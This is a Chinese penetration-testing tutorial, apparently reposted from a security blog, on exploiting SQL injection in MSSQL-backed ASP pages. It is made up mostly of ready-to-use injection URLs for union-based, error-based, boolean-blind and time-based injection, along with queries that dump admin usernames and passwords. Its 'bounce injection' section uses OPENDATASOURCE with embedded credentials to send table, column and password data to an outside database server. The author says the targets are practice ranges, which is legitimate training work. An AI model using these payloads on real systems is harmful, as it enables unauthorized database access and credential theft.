> 原文链接: https://www.anquanke.com//post/id/248896 


# MSSQL数据库注入全方位利用


                                阅读量   
                                **24070**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t014b262f5843f85675.jpg)](https://p1.ssl.qhimg.com/t014b262f5843f85675.jpg)



## 0x01 前言

在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～



## 0x02 注入前准备

### <a class="reference-link" name="1%E3%80%81%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%82%B9"></a>1、确定注入点

```
http://219.153.49.228:40574/new_list.asp?id=2 and 1=1
```

[![](https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png)](https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png)

```
http://219.153.49.228:40574/new_list.asp?id=2 and 1=2
```

[![](https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png)](https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png)

### <a class="reference-link" name="2%E3%80%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BAmssql%E6%95%B0%E6%8D%AE%E5%BA%93"></a>2、判断是否为mssql数据库

sysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。

```
http://219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)&gt;0
```

[![](https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png)](https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png)<br>
还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。

```
http://219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY '00:00:10'; -- asd
```

[![](https://p4.ssl.qhimg.com/t0196919ac7c368e603.png)](https://p4.ssl.qhimg.com/t0196919ac7c368e603.png)

### <a class="reference-link" name="3%E3%80%81%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"></a>3、相关概念

**<a class="reference-link" name="%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E5%BA%93"></a>系统自带库**

MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。<br>
这里了解一下系统级库：

```
master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。
model：模版数据库
tempdb：临时容器
msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。
```

**<a class="reference-link" name="%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E8%A1%A8"></a>系统自带表**

MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。

```
sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。
```

就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个’U’为用户所创建，一个’S’为系统所创建。其他对象类型如下：

```
对象类型：
AF = 聚合函数 (CLR)
C = CHECK 约束
D = DEFAULT（约束或独立）
F = FOREIGN KEY 约束
FN = SQL 标量函数
FS = 程序集 (CLR) 标量函数
FT = 程序集 (CLR) 表值函数
IF = SQL 内联表值函数
IT = 内部表
P = SQL 存储过程
PC = 程序集 (CLR) 存储过程
PG = 计划指南
PK = PRIMARY KEY 约束
R = 规则（旧式，独立）
RF = 复制筛选过程
S = 系统基表
SN = 同义词
SQ = 服务队列
TA = 程序集 (CLR) DML 触发器
TF = SQL 表值函数
TR = SQL DML 触发器
U = 表（用户定义类型）
UQ = UNIQUE 约束
V = 视图
X = 扩展存储过程
```

**排序&amp;获取下一条数据**

mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用&lt;&gt;或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上(‘’)，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：

```
#使用&lt;&gt;获取数据
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name&lt;&gt;'id' and name&lt;&gt;'username'-- qwe
#使用not in获取数据
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe
```

[![](https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png)](https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png)

**<a class="reference-link" name="%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"></a>堆叠注入**

在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。

```
http://192.168.150.4:9001/less-1.asp?id=1';WAITFOR DELAY '0:0:5';-- qwe
```

[![](https://p5.ssl.qhimg.com/t0181df866952842a55.png)](https://p5.ssl.qhimg.com/t0181df866952842a55.png)



## 0x03 显错注入

### <a class="reference-link" name="1%E3%80%81%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E5%AD%97%E6%AE%B5%E6%95%B0"></a>1、判断当前字段数

```
http://219.153.49.228:40574/new_list.asp?id=2 order by 4
```

[![](https://p1.ssl.qhimg.com/t01fbee2e795a2338d5.png)](https://p1.ssl.qhimg.com/t01fbee2e795a2338d5.png)

```
http://219.153.49.228:40574/new_list.asp?id=2 order by 5
```

[![](https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png)](https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png)

通过order by报错情况，可以判断出当前字段为4。

### <a class="reference-link" name="2%E3%80%81%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%98%BE%E9%94%99%E7%82%B9"></a>2、联合查询，获取显错点

1、首先因为不知道具体类型，所以还是先用null来填充字符

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe
```

[![](https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png)](https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png)

2、替换null为’null’，获取显错点

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'null','null',null -- qwe
```

[![](https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png)](https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png)

当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select 'null','null','null',null -- qwe
```

[![](https://p5.ssl.qhimg.com/t0100837f900c3ef729.png)](https://p5.ssl.qhimg.com/t0100837f900c3ef729.png)

### <a class="reference-link" name="3%E3%80%81%E9%80%9A%E8%BF%87%E6%98%BE%E9%94%99%E7%82%B9%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"></a>3、通过显错点获取数据库信息

1、获取数据库版本

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select @@version),null -- qwe
```

[![](https://p4.ssl.qhimg.com/t012f189779bf95f529.png)](https://p4.ssl.qhimg.com/t012f189779bf95f529.png)

2、查询当前数据库名称<br>
通过轮询db_name(**)里**的内容，获取所有数据库库名

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name()),null -- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(1)),null -- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(2)),null -- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(3)),null -- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(4)),null -- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(5)),null -- qwe
```

[![](https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png)](https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png)

[![](https://p4.ssl.qhimg.com/t01409617b57bcdb809.png)](https://p4.ssl.qhimg.com/t01409617b57bcdb809.png)

3、查询当前用户

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select user),null -- qwe
```

[![](https://p3.ssl.qhimg.com/t01e868a65736530e91.png)](https://p3.ssl.qhimg.com/t01e868a65736530e91.png)

### <a class="reference-link" name="4%E3%80%81%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"></a>4、查询表名

查询dbo.sysobjects表中用户创建的表，获取其对应的id和name

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype='U' -- qwe
```

[![](https://p4.ssl.qhimg.com/t0125721234db891a35.png)](https://p4.ssl.qhimg.com/t0125721234db891a35.png)

查询下一个表名

```
#使用&lt;&gt;获取下一条数据
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id &lt;&gt; 5575058 -- qwe
#使用not in获取下一条数据
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id not in ('5575058') -- qwe
```

[![](https://p4.ssl.qhimg.com/t011661598555b1c380.png)](https://p4.ssl.qhimg.com/t011661598555b1c380.png)

### <a class="reference-link" name="5%E3%80%81%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D"></a>5、查询列名

这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058'-- qwe
```

[![](https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png)](https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png)

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe
```

[![](https://p0.ssl.qhimg.com/t01a8944599c209006a.png)](https://p0.ssl.qhimg.com/t01a8944599c209006a.png)

### <a class="reference-link" name="6%E3%80%81information_schema"></a>6、information_schema

值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 table_name from information_schema.tables where table_name &lt;&gt; 'manager'),null -- qwe
```

[![](https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png)](https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png)

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' ),null -- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' and column_name not in ('id','username')),null -- qwe
```

[![](https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png)](https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png)

[![](https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png)](https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png)

### <a class="reference-link" name="7%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"></a>7、获取数据

```
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwe
http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username &lt;&gt; 'admin_mz'-- qwe
```

[![](https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png)](https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png)

解密获取密码

[![](https://p2.ssl.qhimg.com/t016cb243729a0f493a.png)](https://p2.ssl.qhimg.com/t016cb243729a0f493a.png)



## 0x04 报错注入

mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。

### <a class="reference-link" name="1%E3%80%81%E7%9B%B4%E6%8E%A5%E6%8A%A5%E9%94%99"></a>1、直接报错

等号两边数据类型不一致配合子查询获取数据。

```
#获取数据库库名
?id=1' and 1=(select db_name()) -- qwe

```

[![](https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png)](https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png)

```
#获取第一个表名
?id=1' and 1=(select top 1 name from dbo.sysobjects) -- qwe

```

[![](https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png)](https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png)

```
#将数据连接显示
?id=1'  and 1=stuff((select db_name() for xml path('')),1,0,'')--+

```

### <a class="reference-link" name="2%E3%80%81convert()%E5%87%BD%E6%95%B0"></a>2、convert()函数

```
convert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。
```

具体用法如下：

```
#获取数据库库名
?id=1' and 1=convert(int,(select db_name())) -- qwe

```

[![](https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png)](https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png)

```
#获取数据库版本
?id=1' and 1=convert(int,(select @@version))) -- qwe

```

[![](https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png)](https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png)

### <a class="reference-link" name="3%E3%80%81cast()%E5%87%BD%E6%95%B0"></a>3、cast()函数

```
CAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。
```

具体用法如下：

```
#查询当前数据库
?id=1' and 1=(select cast(db_name() as int)) -- qe

```

[![](https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png)](https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png)

```
#查询第一个数据表
?id=1' and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe

```

[![](https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png)](https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png)

### <a class="reference-link" name="4%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%84%E5%90%88%E8%BE%93%E5%87%BA"></a>4、数据组合输出

```
#将数据表组合输出
?id=1' and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path('')),1,0,'')--+

```

[![](https://p0.ssl.qhimg.com/t0126a37aad232cde94.png)](https://p0.ssl.qhimg.com/t0126a37aad232cde94.png)

```
#查询users表中的用户名并组合输出
?id=1'  and 1=stuff((select quotename(username) from users for xml path('')),1,0,'')--+

```

[![](https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png)](https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png)



## 0x05 布尔盲注

### <a class="reference-link" name="1%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%93%E5%90%8D"></a>1、查询数据库库名

1、查询数据库库名长度为11

```
http://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11
```

[![](https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png)](https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png)

2、查询第一个字符的ascii码为109

```
http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109
http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))&gt;109
```

[![](https://p5.ssl.qhimg.com/t0116e04363840e9a62.png)](https://p5.ssl.qhimg.com/t0116e04363840e9a62.png)

[![](https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png)](https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png)

3、查询第二个字符的ascii码为111

```
http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111
```

[![](https://p5.ssl.qhimg.com/t01e337930ebb104e75.png)](https://p5.ssl.qhimg.com/t01e337930ebb104e75.png)

4、获取所有ascii码之后，解码获取数据

[![](https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png)](https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png)

### <a class="reference-link" name="2%E3%80%81%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"></a>2、查询表名

除了像上面查询库名使用了ascii码外，还可以直接猜解字符串

```
http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m'
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019bb4ff316062345b.png)

```
http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,6)='manage'
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017026272920723c8d.png)



## 0x06 延时盲注

### <a class="reference-link" name="1%E3%80%81%E5%BB%B6%E6%97%B6%E5%87%BD%E6%95%B0%20WAITFOR%20DELAY"></a>1、延时函数 WAITFOR DELAY

```
语法：n表示延时几秒
WAITFOR DELAY '0:0:n'id=1 if (布尔盲注的判断语句) WAITFOR DELAY '0:0:5' -- qwe
```

### <a class="reference-link" name="2%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"></a>2、查询数据

```
#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒
http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY '0:0:5' -- qwe
```

[![](https://p3.ssl.qhimg.com/t018900c2d899e6edae.png)](https://p3.ssl.qhimg.com/t018900c2d899e6edae.png)

```
#判断如果第一个表的表名的第一个字符为m，则延时5秒
http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m') WAITFOR DELAY '0:0:5' -- qwe
```

[![](https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png)](https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png)



## 0x07 反弹注入

就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。<br>
反弹注入条件相对苛刻一些，一是需要一台搭建了mssql数据库的vps服务器，二是需要开启堆叠注入。<br>
反弹注入需要使用opendatasource函数。

```
OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。
```

### <a class="reference-link" name="1%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"></a>1、环境准备

1、首先打开靶场

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0125c9c6371197c223.png)

3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。

```
CREATE TABLE test(name VARCHAR(255))
```

[![](https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png)](https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png)

### <a class="reference-link" name="2%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E8%A1%A8"></a>2、获取数据库所有表

1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。

```
#查询sysobjects表
?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype='U' -- qwe
#查询information_schema数据库
?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe
```

2、执行成功页面返回正常。

[![](https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png)](https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png)

3、在数据库中成功获取到数据。

[![](https://p2.ssl.qhimg.com/t014a5c058780e87669.png)](https://p2.ssl.qhimg.com/t014a5c058780e87669.png)

### <a class="reference-link" name="3%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93admin%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"></a>3、获取数据库admin表中的所有列名

```
#查询information_schema数据库
?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name='admin'-- qwe
#查询syscolumns表
?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018c0e415a5ac7d536.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01957478eb17de4d8a.png)

### <a class="reference-link" name="4%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"></a>4、获取数据

1、首先新建一个表，里面放三个字段，分别是id，username和passwd。

```
CREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255))
```

2、获取admin表中的数据

```
?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe

```

[![](https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png)](https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png)

[![](https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png)](https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png)



## 0x08 总结

```
完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。

靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～
```
